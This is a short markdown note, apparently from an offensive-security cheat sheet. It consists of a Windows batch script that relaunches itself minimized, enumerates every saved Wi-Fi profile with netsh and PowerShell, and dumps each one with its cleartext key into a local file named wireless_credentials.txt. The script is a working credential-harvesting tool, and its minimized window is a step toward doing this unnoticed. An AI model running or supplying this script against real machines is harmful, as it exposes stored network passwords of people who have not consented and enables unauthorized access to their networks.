# Wi-Fi

## Scripting

### Batch

```batch
@echo off
rem minimize the window
if not "%1"=="min" start "" /min "%~f0" min & exit

setlocal enabledelayedexpansion

rem set the output file location
set "output_file=%CD%\wireless_credentials.txt"

rem create or clear the output file
> "%output_file%" (
    rem add a marker for when the dump will start
    echo ===== Wi-Fi dump (%date% %time%) =====
)

rem PowerShell gets all profile names (handles spaces / locale)
for /f "usebackq delims=" %%P in (`powershell.exe -NoProfile -Command "(netsh.exe wlan show profiles) -match ':' | ForEach-Object { ($_.Split(':',2)[1].Trim()) }"`) do (
  echo [%%P] >> "%output_file%"
  netsh.exe wlan show profile name="%%~P" key=clear >> "%output_file%" 2>&1
  echo . >> "%output_file%"
)

echo .
echo Wi-Fi details have been appended to:
echo %output_file%
endlocal
```